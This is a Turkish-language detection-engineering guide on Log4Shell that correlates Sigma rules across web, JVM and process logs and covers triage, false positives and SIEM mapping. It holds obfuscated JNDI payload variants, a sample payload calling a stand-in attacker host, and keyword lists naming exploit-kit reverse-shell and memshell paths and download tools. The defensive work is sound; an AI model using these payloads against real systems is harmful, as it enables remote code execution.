# Log4Shell / JNDI Injection — Tespiti

> Saha notu: Bu metin bir saldırı reçetesi değil, bir tespit mühendisinin defterinden çıkma bir yargı kılavuzudur. Log4Shell (CVE-2021-44228) artık "yeni" bir tehdit değil, ama tam da bu yüzden tehlikeli: aradan geçen zamanda korpus dolusu naif kural yazıldı, hepsi `${jndi:` arıyor, ve saldırgan bunu yıllar önce ezberledi. Değer, imzada değil; sinyalleri **bağlamakta** ve tespitin gerçekte neden bozulduğunu bilmekte.

---

## 1. Özet: saldırı + naif tespit (kısa)

Log4Shell, Apache Log4j 2 kütüphanesinin `${...}` "lookup" (arama) mekanizmasındaki bir tasarım hatasıdır. Log4j, bir log satırının **içeriğini** yazarken içinde `${jndi:ldap://...}` gibi bir ifade görürse, bunu bir metin olarak yazmak yerine **çözümlemeye** çalışır: JNDI (Java Naming and Directory Interface) üzerinden belirtilen sunucuya gider, dönen nesneyi (Java sınıfı) indirir ve çalıştırır. Saldırgan için bunun anlamı şudur: uygulamanın **loglama yaptığı herhangi bir alan** — User-Agent, X-Forwarded-For, bir arama kutusu, bir HTTP başlığı, bir kullanıcı adı — uzaktan kod çalıştırma (RCE) kanalına dönüşür. Kimlik doğrulama gerekmez; saldırganın tek ihtiyacı, girdisinin bir yerde `log.error(...)` benzeri bir çağrıya ulaşmasıdır.

Zincir kavramsal olarak şudur: kötücül dize → savunmasız uygulamanın Log4j'si dizeyi çözümler → JNDI, saldırganın LDAP/RMI sunucusuna bağlanır → sunucu bir referans döndürür → JVM ikinci-aşama sınıfı indirir → kod `java.exe`/JVM altında çalışır. Buradan sonrası klasik post-exploitation'dır: keşif, indirme, kalıcılık.

**Naif tespit** şuna benzer: WAF'ta veya SIEM'de `${jndi:` metnini ara. Ya da eldeki ilk gerçek Sigma kuralı gibi, JVM uygulama hata loglarında iki anahtar kelimeyi ara:

```
logsource: { category: application, product: jvm }
detection:
  keywords:
    - 'com.sun.jndi.ldap.'
    - 'org.apache.logging.log4j.core.net.JndiManager'
  condition: keywords
```

Bu kural (`bb0e9cec`) iyi bir kuraldır — ama **neden** iyi olduğu ve nerede kör olduğu, işin özüdür. Dikkat edin: bu kural payload'un kendisini (`${jndi:`) aramıyor; uygulamanın **hata logunda** JNDI çözümlemesi denemesinin bıraktığı yığın izini (stack trace) arıyor. Yani sömürünün *sonucunu* arıyor, *girdisini* değil. Bu ayrım, bu metnin bel kemiğidir.

---

## 2. Naif tespit neden yetmez

### 2.1 `${jndi:` aramak: en kolay atlatılan imza

Log4Shell'in trajik yanı, atlatma tekniklerinin sömürüyle **aynı gün** yayılmış olmasıdır. Log4j'nin lookup mekanizması iç içe (nested) çözümlemeyi destekler, ve bu, imza tabanlı her aramayı işe yaramaz hale getirir. Aşağıdaki dizelerin hepsi `${jndi:ldap://...}` ile aynı şeye çözümlenir ama düz metin araması hiçbirini yakalamaz:

- `${${lower:j}ndi:...}` — `lower` lookup'ı `j` harfini çözümler, birleşince `jndi` olur.
- `${${::-j}${::-n}${::-d}${::-i}:...}` — her harf ayrı bir varsayılan-değer ifadesiyle inşa edilir.
- `${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://...}` — şema (`ldap`) parça parça kurulur.
- `${${env:FOO:-j}ndi:...}` — ortam değişkeni lookup'ı ile gizleme.

Sonuç: WAF/SIEM'de `${jndi:` veya `jndi:ldap` düz metin araması **yalnızca beceriksiz veya gürültü üreten otomatik tarayıcıları** yakalar. Hedefli bir saldırgan bu imzayı hiçbir zaman tetiklemez. Bu yüzden birinci gerçek kural (`bb0e9cec`) doğru bir tercih yapıyor: girdiyi değil, **sonucu** — `com.sun.jndi.ldap.` sınıf yolunu ve `org.apache.logging.log4j.core.net.JndiManager`'ı — arıyor. Çünkü payload nasıl gizlenirse gizlensin, çözümleme başarısız olduğunda (ya da başarılı olduğunda) JVM'in ürettiği stack trace'te bu **gerçek sınıf adları** düz metin olarak belirir. Saldırgan payload'unu obfuscate edebilir; JVM'in kendi hata çıktısını obfuscate edemez.

### 2.2 Ama sonuç-tabanlı kural da tek başına kör

Birinci kuralın kör noktaları:

1. **Log seviyesi bağımlılığı.** Kuralın kendi tanımı bunu itiraf ediyor: `'Requirements: application error logs must be collected (with LOG_LEVEL=ERROR and above)'`. Eğer JNDI çözümlemesi **başarılı** olduysa — yani saldırgan LDAP sunucusu ayakta ve geçerli bir referans döndürdüyse — hiçbir hata (exception) oluşmayabilir, dolayısıyla ERROR seviyesinde log satırı da oluşmaz. Bu kural paradoksal biçimde en çok **başarısız** sömürüleri ve tarama gürültüsünü yakalar; sessizce **başarılı** olan hedefli sömürüyü kaçırabilir. Başarılı sömürü, ancak dış bağlantı (LDAP/RMI çıkışı) ve sonraki child process ile görünür hale gelir.

2. **Uygulama log toplama pratiği.** Sahada JVM uygulama loglarının merkezi SIEM'e akıtılması **istisnadır, kural değil**. Çoğu kurumda `catalina.out`, uygulama `stdout`'u veya `app.log` diskte kalır, forwarder ile toplanmaz. Bu kuralın `logsource: category: application, product: jvm` gereksinimi, sahanın büyük kısmında karşılanmaz. Kural mükemmel yazılmış olabilir; besleme yoksa çalışmaz.

3. **Uygulama içi maskeleme.** Bazı framework'ler exception'ları yakalar ve genel bir "500 Internal Server Error" ile yutar; JNDI sınıf adı stack trace'e hiç ulaşmaz. Modern Log4j (2.17+) veya `log4j2.formatMsgNoLookups=true` ile hafifletilmiş sistemlerde çözümleme hiç denenmez — bu iyi haber, ama tespit açısından da o sinyali görmezsiniz.

### 2.3 Tek katman = kör tespit

Özet yargı: JNDI enjeksiyonunun hiçbir tek sinyali yeterince güvenilir değildir. `${jndi:` düz metni → atlatılır. Uygulama stack trace'i → besleme/seviye bağımlı ve başarılı sömürüde sessiz. Sadece dış LDAP bağlantısı → meşru servislerden ayırt edilemez. Değerli tespit, bu zayıf sinyalleri **zaman ve bağlam** üzerinden birbirine dikmekten doğar. Bir sonraki bölüm tam olarak budur.

---

## 3. Korelasyon zinciri (asıl değer)

Tek sinyal zayıf. Yüksek güven, farklı bağlamlardan gelen sinyalleri kısa bir zaman penceresinde üst üste bindirmekten çıkar. İşte elimizdeki dört gerçek kuralı bir **ihlal anlatısına** dizen somut örnek.

### 3.1 Halka A — Payload'un girişi (webserver katmanı)

Saldırgan `${jndi:ldap://attacker.tld/x}` benzeri bir dizeyi User-Agent başlığında gönderir. Eğer saldırgan JNDI-Exploit-Kit gibi hazır bir araç kullanıyorsa, ikinci-aşama URI'si web erişim loglarında görünür. Üçüncü gerçek kural (`412d55bc`, *JNDIExploit Pattern*) tam bunu hedefler:

```
logsource: { category: webserver }
detection:
  keywords:
    - '/Basic/Command/Base64/'
    - '/Basic/ReverseShell/'
    - '/Basic/TomcatMemshell'
    - '/Deserialization/URLDNS/'
    - '/Deserialization/CommonsCollections2/Command/Base64/'
    - '/TomcatBypass/Dnslog/'
```

Bu URI parçaları JNDI-Exploit-Kit'in servis ettiği ikinci-aşama yollarıdır. **Önemli bağlam:** bu izler saldırganın *kendi* sunucusuna aittir; ama kurbanın uygulaması bu URL'e giderken ya da callback loglanırken web/proxy katmanında görünebilir. Tek başına bu bir "toolkit kullanılıyor" sinyalidir — orta güven, çünkü olgun bir saldırgan JNDI-Exploit-Kit'in varsayılan yollarını değiştirir.

### 3.2 Halka B — Çözümleme denemesinin izi (uygulama katmanı, KISA pencere)

Payload uygulamaya ulaştıktan **saniyeler sonra**, savunmasız Log4j JNDI çözümlemesi dener. Başarısız olursa (LDAP erişilemez, referans geçersiz, ya da yeni JVM'de `TrustURLCodebase` kapalı), birinci kural (`bb0e9cec`) uygulama hata logunda `com.sun.jndi.ldap.` ve `org.apache.logging.log4j.core.net.JndiManager` sınıflarını yakalar. Bu, farklı bir bağlamdan (application/jvm) gelen ikinci sinyaldir.

Korelasyon kuralı: **Halka A (webserver'da toolkit URI'si veya bir kaynak IP'den JNDI-benzeri istek) + ≤ 60 saniye içinde aynı host'ta Halka B (JVM stack trace'inde JndiManager)** = artık "belki tarama" değil, "bu uygulama JNDI çözümlemesi yaptı" yargısı. Güven seviyesi tek başına her sinyalden çok daha yüksek.

### 3.3 Halka C — Sömürünün gerçekleştiğinin kanıtı (process_creation katmanı)

Asıl ihlal kanıtı budur ve en yüksek güveni buradan alırsınız. JVM ikinci-aşama sınıfı çalıştırdığında, tipik post-exploitation davranışı `java.exe`/JVM sürecinin **anormal bir çocuk süreç** doğurmasıdır. Beşinci gerçek kural (`0d34ed8b`, *Suspicious Processes Spawned by Java.EXE*) tam bunu yakalar:

```
logsource: { category: process_creation, product: windows }
detection:
  selection:
    ParentImage|endswith: '\java.exe'
    Image|endswith:
      - '\certutil.exe'
      - '\bitsadmin.exe'
      - '\curl.exe'
      - '\mshta.exe'
      - '\cscript.exe'
      - '\net.exe'
      - '\net1.exe'
      - '\query.exe'
      # ... (AppVLP, forfiles, hh, mftrace)
```

`ParentImage` `\java.exe` ile biten bir sürecin `certutil.exe` veya `curl.exe` doğurması, meşru dünyada neredeyse hiç olmaz. Bir Java uygulama sunucusu neden `certutil` çalıştırsın? Bu, JNDI sömürüsünün **ikinci-aşama indirme** adımının klasik imzasıdır. Linux tarafında bunun karşılığı, `ParentImage`'ı `/bin/java` olan bir sürecin `/bin/sh`, `curl`, `wget`, `nc` doğurmasıdır (ayrı bir Linux process_creation kuralıyla; buradaki Windows kuralının mantığını Linux'a taşırsınız).

### 3.4 Halka D — Post-exploitation niyeti (git clone keşfi)

İkinci ve dördüncü kurallar (`cfec9d29` Linux ve `aef9d1f1` Windows, *Suspicious Git Clone*) sömürü sonrası aşamayı yakalar: saldırgan makinede `git clone` ile bir exploit/araç deposu çeker. `CommandLine|contains: ' clone '` **ve** anahtar kelimelerden biri (`exploit`, `CVE-`, `poc-`, `RCE`, `Invoke-`, `log4sh...`, `proxyshell`) geçtiğinde tetiklenir. Bu, JNDI zincirinin *kendisi* değildir; ama ele geçirilmiş bir JVM host'unda bu sinyalin görülmesi, önceki halkaları geriye doğru doğrular.

### 3.5 Zincirin somut ifadesi

> **A** (webserver: bir dış IP'den gelen istekle ilişkili `/Basic/Command/Base64/` URI'si veya JNDI-benzeri User-Agent) **+ kısa pencere ≤ 90 sn içinde B** (aynı host, application/jvm: `org.apache.logging.log4j.core.net.JndiManager` stack trace) **+ C** (aynı host, process_creation: `ParentImage=\java.exe` → `Image=\curl.exe`/`\certutil.exe`) **= yüksek güvenli JNDI RCE ihlali.**

Bu üç halkanın **farklı log kaynaklarından** (webserver, application, endpoint) gelmesi kritiktir: bir saldırgan üç ayrı katmanı aynı anda susturamaz. C halkası tek başına bile P1'dir; A+B+C ise incelemesiz kapatılamaz. Pratikte SIEM'de bunu bir korelasyon araması (Splunk `transaction`/`stats by host` veya Sentinel `join`) olarak, host anahtarı ve 90 saniyelik `maxspan` ile kurarsınız.

---

## 4. False positive gerçeği ve triage yargısı

Her kuralın kendi FP profili vardır. Analistin işi, alarmı görünce **hangi katmanda olduğunu** anlayıp doğru soruyu sormaktır.

### 4.1 Birinci kural (JVM stack trace) — FP kaynakları

Kuralın kendisi `falsepositives: Application bugs` diyor, ve bu ciddiye alınmalı. `com.sun.jndi.ldap.` sınıfı **meşru** JNDI/LDAP kullanan uygulamalarda her gün geçer: LDAP'a bağlanan bir kimlik doğrulama modülü, JMS, bir connection pool, Spring'in JNDI datasource lookup'ı. Bir uygulama LDAP sunucusuna bağlanamadığında ürettiği rutin exception, bu kuralı tetikler. Ayrıca **güvenlik tarayıcıları** (Nessus, Qualys, Log4Shell özel tarayıcıları) ve **bug bounty** ekipleri, kurumun uygulamalarına kasıtla `${jndi:...}` gönderir — bunlar gerçek payload'dır ama kötü niyetli değildir.

**Triage yargısı:** Alarmı gördüğünde ilk ayrım şudur — stack trace'te `com.sun.jndi.ldap.` var ama **payload girişi (Halka A)** ve **child process (Halka C)** yok ise, büyük olasılıkla ya meşru LDAP kullanımı ya da bir tarayıcının değdiği ama sömürülemeyen bir uç. Öncelik düşük. Ama stack trace'in yanında aynı host'ta anormal `java.exe` çocuğu varsa, bu artık FP değil — anında P1.

### 4.2 Beşinci kural (java.exe child process) — FP kaynakları

Bu kural yüksek isabetlidir ama FP'siz değil. Bazı Java tabanlı **kurumsal yazılımlar meşru olarak** sistem araçları çağırır: bir yapılandırma yönetimi ajanı, bir Java tabanlı yedekleme/dağıtım aracı, ya da bir CI/CD runner'ı (`java` → `net.exe` ile paylaşım eşleme, `curl` ile artifact çekme). Örneğin bazı SCCM/yazılım dağıtım senaryolarında Java tabanlı yükleyiciler `certutil` veya `bitsadmin` çağırabilir. `query.exe` özellikle gürültülüdür (RDP oturum sorgulama).

**Triage önceliklendirmesi (analistin sırası):**

1. **En yüksek öncelik:** `ParentImage=\java.exe` → `Image=\certutil.exe`/`\bitsadmin.exe`/`\mshta.exe`/`\curl.exe` **ve** CommandLine'da dış bir URL/IP var. İndirme davranışı + Java ebeveyni = neredeyse kesin sömürü. Hemen host izole et.
2. **Yüksek:** `java.exe` → `\net.exe`/`\net1.exe`/`\cscript.exe`, iç keşif/lateral. Sömürü sonrası aşama olabilir; JVM'in kimliğini ve çalışan uygulamayı doğrula.
3. **Orta:** `java.exe` → `\query.exe` tek başına. Muhtemelen gürültü, ama ebeveyn JVM'in bir internet-facing uygulama sunucusu (Tomcat, WebLogic, VMware ürünleri) olup olmadığına bak.
4. **Bağlam sorgusu her zaman aynı:** Bu `java.exe` **hangi** uygulama? İnternete açık mı? Aynı zaman penceresinde webserver veya jvm-application loglarında Halka A/B var mı? Bu uygulama bilinen bir yazılım dağıtım/CI ajanı mı (allowlist)?

### 4.3 Git clone kuralları — FP kaynakları

Geliştirici iş istasyonlarında `git clone ... CVE-...` veya `... exploit ...` içeren depolar **meşru olarak** klonlanır — güvenlik araştırmacıları, kırmızı takım, hatta bu dokümanı okuyan mavi takım. Bu kurallar geliştirici/araştırmacı ortamlarında yüksek FP üretir. **Yargı:** bu kuralları bir **sunucuda** (özellikle internet-facing JVM host'unda) gördüğünde ciddiye al; bir geliştirici laptopunda gördüğünde büyük olasılıkla iş akışıdır. Bağlam (asset rolü) kararı belirler.

### 4.4 Genel FP sel yönetimi

Log4Shell sonrası dönemde `${jndi:` düz metin araması **kalıcı bir tarama seli** üretir — internet arka planında sürekli otomatik tarama var. Bu yüzden birçok olgun SOC, salt-imza `${jndi:` alarmını ya kapatır ya da yalnızca "korelasyon besleyicisi" olarak tutar, tek başına ticket açtırmaz. Değerli olan, o sinyali C halkasıyla (java child process) birleştirebildiğinizde ortaya çıkar.

---

## 5. Kaçınma → karşı-tespit

Dokümanlarda yazmayan, sahada görülen atlatma teknikleri ve bunlara karşı ikinci-derece tespit.

### 5.1 Payload obfuscation → sonuç-tabanlı tespit

Bölüm 2.1'deki nested-lookup gizleme, girdi-tabanlı her imzayı öldürür. **Karşı-tespit:** birinci kuralın felsefesini benimse — girdiyi arama, **sonucu** ara. `org.apache.logging.log4j.core.net.JndiManager` sınıfı, payload nasıl yazılırsa yazılsın stack trace'te belirir. Girdi katmanında yenildiğinde, çözümleme-sonucu katmanına in.

### 5.2 LDAP yerine alternatif protokoller → çıkış tespiti

Erken imzalar `jndi:ldap` arıyordu. Saldırganlar `jndi:rmi://`, `jndi:dns://`, `jndi:ldaps://`, `jndi:iiop://`, `jndi:nis://` şemalarına geçti. **Karşı-tespit:** protokol dizesini aramak yerine **ağ davranışına** bak. Bir uygulama sunucusunun (Tomcat, WebLogic vb.) **giden** LDAP (389/636), RMI (1099) ya da beklenmedik yüksek portlara, hele **internetteki** bir IP'ye bağlantı kurması son derece anormaldir. İlk aşama sömürü çoğu zaman bir **DNS callback** ile başlar (`/TomcatBypass/Dnslog/`, `/Deserialization/URLDNS/` — üçüncü kuraldaki URI'ler bunu ele veriyor): saldırgan önce zafiyeti bir DNS lookup ile doğrular. Bu yüzden JVM host'larından çıkan, veri sızdırma öncesi **beklenmedik dış DNS sorguları** güçlü bir erken sinyaldir.

### 5.3 Fileless / bellek-içi ikinci aşama → child process yerine anomali

Olgun saldırgan `certutil` ile diske indirme yapmaz (çünkü beşinci kural tam onu yakalar). Bunun yerine ikinci-aşama sınıfı doğrudan JVM belleğinde çalıştırır — bir **memshell** enjekte eder. Üçüncü kuraldaki `/Basic/TomcatMemshell`, `/Basic/JettyMemshell`, `/Basic/SpringMemshell` URI'leri tam bunun içindir. Memshell, `java.exe`'nin altında yeni bir child process **doğurmaz**; bu yüzden beşinci kural sessiz kalır. **Karşı-tespit:** (a) JVM host'unda **yeni bir dinleyici port/servlet** belirmesi, (b) mevcut web uygulamasının davranış değişikliği (kayıtsız bir URL yoluna yanıt vermeye başlaması), (c) JVM sürecinin çıktığı ağ bağlantı deseninin değişmesi. Bunlar process_creation'da görünmez; ağ ve uygulama-davranış katmanı gerektirir.

### 5.4 `git clone` yerine sessiz araç transferi → farklı LOLBin

Dördüncü/ikinci kuralı bilen saldırgan `git clone` kullanmaz; araçları `curl`, `wget` ile ya da doğrudan memshell üzerinden transfer eder. **Karşı-tespit:** git-clone kuralına bel bağlama; onu bir **teyit sinyali** olarak tut, birincil tespit olarak değil. Birincil tespit her zaman C halkası (anormal java child) ve ağ çıkışı olmalı.

### 5.5 Log susturma → besleme bütünlüğü tespiti

Sömürü sonrası saldırgan `log4j2.formatMsgNoLookups` ayarını değiştiremese de, uygulama loglarını veya forwarder'ı susturmayı deneyebilir. **Karşı-tespit:** JVM application log besleme kanalının **ani sessizliği** (bir uygulamanın normalde saatte N satır üretirken sıfıra düşmesi) kendi başına bir alarm olmalı. İkinci-derece: forwarder heartbeat kaybı.

---

## 6. SIEM/saha gerçeği

### 6.1 Field mapping — kuralların gerçek alan adları

Sigma soyut; sahada ürün alanlarına eşlenir. Beşinci kuralın `ParentImage`/`Image` alanları için:

- **Sysmon Event ID 1 (Process Creation):** `ParentImage` ve `Image` doğrudan mevcut. En temiz kaynak. CommandLine tam görünür.
- **Windows Security Event ID 4688 (A new process has been created):** `Image` → `NewProcessName`, `ParentImage` → `ParentProcessName` (yalnızca "Include command line in process creation events" GPO'su açıksa `Process Command Line` alanı gelir; **varsayılan kapalıdır** — bu yüzden 4688 çoğu kurumda git-clone kurallarının `CommandLine|contains` mantığını **besleyemez**). Bu, sahanın en sık atladığı boşluktur: 4688 var ama komut satırı yok, dolayısıyla kural sessizce hiç eşleşmez.
- **EDR (CrowdStrike/Defender/SentinelOne):** kendi telemetri şemasında `ParentBaseFileName`/`FileName` gibi alanlara eşlenir; Sysmon'a çevrilirken `\java.exe` endswith mantığı korunur.

Birinci kuralın `product: jvm` / `category: application` alanı en zor eşlenendir: bu, yapılandırılmamış uygulama log metnidir. `keywords` düz metin araması olduğu için `com.sun.jndi.ldap.` dizesinin ham log satırında (`message`/`_raw`) geçmesi gerekir — parse edilmiş bir alanda değil.

### 6.2 Varsayılan loglanmayanlar (en kritik saha gerçeği)

- **JVM uygulama logları merkezi toplanmaz.** `catalina.out`, `application.log` çoğu kurumda diskte kalır. Birinci kuralın çalışması için bir forwarder ile ERROR+ seviyesinde toplama şarttır — ve bu, ayrıca kurulması gereken bir iştir.
- **4688 komut satırı varsayılan kapalı** (yukarıda). Git-clone kuralları bunsuz çalışmaz.
- **Giden (egress) ağ bağlantıları** — Sysmon Event ID 3 (Network Connection) varsayılan olarak Sysmon'da bile gürültü nedeniyle sık kısıtlanır; JVM host'undan çıkan LDAP/RMI/DNS callback'i görmek için ya Sysmon ID 3 ya firewall/proxy egress logları gerekir. Bölüm 5'teki ağ-tabanlı karşı-tespitlerin çoğu bu besleme olmadan çalışmaz.
- **HTTP POST gövdesi ve başlıklar** — payload çoğu zaman User-Agent'ta veya bir POST gövdesindedir; standart web erişim logları (`access.log`, IIS W3C) **başlıkları ve POST gövdesini kaydetmez**, yalnızca URI + query string'i kaydeder. Bu yüzden üçüncü kuralın webserver keyword'leri, ancak payload URL yolunda göründüğünde işe yarar; başlıktaki `${jndi:...}` çoğu web log'unda **hiç görünmez**. Girdi katmanının en büyük kör noktası budur.

### 6.3 Splunk / Sentinel / Elastic farkı

- **Splunk:** JVM app logu genelde `index=app` / `sourcetype=log4j` altında, `_raw`'da düz metin. Birinci kural: `index=app ("com.sun.jndi.ldap." OR "org.apache.logging.log4j.core.net.JndiManager")`. Beşinci kural Sysmon için `EventCode=1`. Korelasyon: `stats` veya `transaction host maxspan=90s` ile A+B+C birleştirme. Egress için `index=proxy` / firewall.
- **Microsoft Sentinel (KQL):** Beşinci kural `DeviceProcessEvents | where InitiatingProcessFileName == "java.exe" and FileName in ("certutil.exe","curl.exe",...)` (Defender XDR şeması). Java uygulama logları Sentinel'e nadiren gelir — genelde bir custom log tablosu (`Log4j_CL`) gerektirir. Korelasyon `join kind=inner ... on DeviceId` + `datetime_diff`.
- **Elastic (ECS):** `process.parent.name: "java.exe" and process.name: ("certutil.exe" or "curl.exe" ...)`. ECS'te `winlog.event_id` ve `process.command_line`. JVM logları için Filebeat log4j modülü/ingest pipeline gerekir; multiline stack trace ayrıştırma ayrıca yapılandırılmalı yoksa `com.sun.jndi.ldap.` satırı ana mesajdan kopabilir.

### 6.4 Tuning yargısı — sahada nasıl yaşatılır

1. **`${jndi:` salt-imza alarmını ticket'tan çıkar.** Sürekli tarama seli üretir. Onu bir "enrichment/korelasyon besleyicisi" olarak sakla; tek başına P-seviyesi verme.
2. **Beşinci kuralı (java child process) omurga yap.** En yüksek isabet burada. Bilinen meşru Java yazılım dağıtım/CI ajanlarını (asset + parent CommandLine imzasıyla) allowlist'e al; kalan her `java.exe → certutil/curl/mshta/bitsadmin` P1 olsun.
3. **A+B+C korelasyonunu asıl alarm yap.** Tek katman gürültü; üç katman kesin. `maxspan` 60–120 sn, anahtar `host`.
4. **Asset bağlamını enrich et.** İnternet-facing JVM host'ları (Tomcat, WebLogic, VMware Horizon/vCenter, Unifi, ElasticSearch, Solr) için eşiği düşür; iç geliştirme host'ları için git-clone kurallarını sustur.
5. **Egress beslemesini kur.** JVM host'larından çıkan LDAP/RMI/beklenmedik-DNS trafiği, obfuscation'a bağışık en dayanıklı sinyaldir. Girdi imzası atlatıldığında elinde kalan tek sağlam katman budur.
6. **Uygulama log beslemesini denetle.** Birinci kural yalnızca ERROR+ toplama varken çalışır; sessiz-başarılı sömürüde zaten kör olduğunu unutma — onu C ve egress ile eşleştir, tek başına güvenme.

**Kapanış yargısı:** Log4Shell tespiti, imza yarışını çoktan kaybetti — obfuscation girdi katmanını öldürdü. Kazanan strateji sonuç ve davranış katmanlarını dikmektir: JVM'in ürettiği stack trace (susturulamaz sınıf adı), `java.exe`'nin doğurduğu anormal çocuk (meşru dünyada yok), ve JVM host'undan çıkan beklenmedik ağ bağlantısı (obfuscation'a bağışık). Bu üçü ayrı katmanlardan gelir; saldırgan üçünü aynı anda susturamaz. Tespit mühendisinin işi, tek imzaya güvenmek değil, bu üç zayıf sinyali kısa bir zaman penceresinde birbirine bağlayan korelasyonu kurmaktır.
